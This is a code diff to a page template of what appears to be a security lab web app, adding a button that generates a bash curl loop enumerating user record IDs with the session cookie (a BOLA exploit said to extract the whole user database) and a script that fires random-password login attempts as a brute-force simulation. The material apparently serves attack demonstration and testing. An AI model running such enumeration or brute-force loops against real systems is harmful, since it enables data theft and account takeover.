@@ -22,12 +22,26 @@ content %}
 
 <p>
   <b>Generate BOLA command</b><br />
-  Click "Cenerate BOLA command" to generate ready to go BOLA exploitation command for bash. 
+  Click "Cenerate BOLA command" to generate ready to go BOLA exploitation command for bash.
+  When executed, the whole user database will be extracted.  
 </p>
-<button id="GenerateBOLAButton">Generate BOLA</button>
+<button id="GenerateBOLAButton">Generate BOLA command</button>
 <div id="GenerateBOLAResult" class="result"></div>
 <br />
 
+<p>
+  <b>Run successful brute-force attack</b><br />
+  This script will generate successful brute-force attack against authentication endpoints. 
+  You need to provide number of failed attempts before the successful attempt is tried. Please
+  provide valid username and password. 
+</p>
+<input type="text" style="width: 40%" id="GenerateBruteForce-username" placeholder="username" />
+<input type="password" style="width: 40%" id="GenerateBruteForce-password" placeholder="password" />
+<input type="text" style="width: 18%" id="GenerateBruteForce-attempts" placeholder="attempts" />
+<button id="GetSumButton">Run Brute Force Attack</button>
+<div id="GenerateBruteForceResult" class="result"></div>
+
+<br />
 
 <script>
   function getCookie(name) {
@@ -38,6 +52,17 @@ content %}
     }
     return null; // cookie not found
   }
+
+  function randomString(length = 8) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+
+    for (let i = 0; i < length; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+  return result;
+  }
+
 
   document.getElementById("GetHeadersButton").onclick = () => {
     fetch("/api/GetHeaders")
@@ -56,12 +81,74 @@ content %}
         .then((data) => {
           if (data.username) {
             document.getElementById("GenerateBOLAResult").textContent =
-             'n=1; while [[ $n -lt 200 ]]; do echo "===Got record ID: $n"; curl --location --request POST "http://lab.spm.pl/api/GetUserData" --header "Accept: application/json" --header "Content-Type: application/json" -b "session=' + getCookie("session") + '" --data-raw "{\\\"id\\\":\\\"$n\\\"}" -s; echo ""; echo ""; n=$((n+1)); sleep 0.5; done'
+             'n=1; while [[ $n -lt 200 ]]; do echo "===Got record ID: $n"; curl --location --request POST "http://' + window.location.hostname + ':' + window.location.port + '/api/GetUserData" --header "Accept: application/json" --header "Content-Type: application/json" -b "session=' + getCookie("session") + '" --data-raw "{\\\"id\\\":\\\"$n\\\"}" -s|jq; echo ""; echo ""; n=$((n+1)); sleep 2; done'
           } else {
             document.getElementById("GenerateBOLAResult").textContent =
-              "nie ma sesji";
+              "You must be authenticated to generate BOLA command.";
           }
         });
+  };
+
+
+  document.getElementById("GetSumButton").onclick = () => {
+  
+    const username = document.getElementById("GenerateBruteForce-username").value;
+    const password = document.getElementById("GenerateBruteForce-password").value;
+    const attempts = parseInt(document.getElementById("GenerateBruteForce-attempts").value, 10);
+    
+    fetch("/api/GetSession")
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.username) {
+            document.getElementById("GenerateBruteForceResult").textContent = 
+            "You can't run this command while you are authenticated. Please log out first."
+          } 
+          else {
+            if (isNaN(attempts) || attempts < 0) {
+              document.getElementById("GenerateBruteForceResult").innerText = "The Number of Attempts must be a positive number"
+            }
+            else {
+                document.getElementById("GenerateBruteForceResult").innerText = ""
+                for (let i = 1; i <= attempts; i++) {
+ 
+                  let temp_password = password;
+
+                    if (i !== attempts) {
+                      temp_password = randomString()
+                    }
+
+                    fetch("/api/login", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ "username": username, "password": temp_password }),
+                    })
+                      .then(async res => {
+                        if (!res.ok) {
+                          if (res.status === 401) throw new Error('Unauthorized - please log in');
+                          const message = await res.text();
+                          throw new Error(message || `HTTP error ${res.status}`);
+                          document.getElementById("GenerateBruteForceResult").innerText += "Attempt: Blocked\n"
+                        }
+                        return res.json();
+                      })
+                      .then((data) => {
+                          if(data.success) {
+                            document.getElementById("GenerateBruteForceResult").innerText += "Attempt (" + i + "/" + attempts + "): Successful\n"
+                          }
+                          else {
+                            document.getElementById("GenerateBruteForceResult").innerText += "Attempt (" + i + "/" + attempts + "): Failed\n";
+                          };
+                      })
+                      .catch(err => {
+                      console.error(err);
+                      });
+                  }
+              }
+            }
+        });
+
+
+
   };
 </script>
 
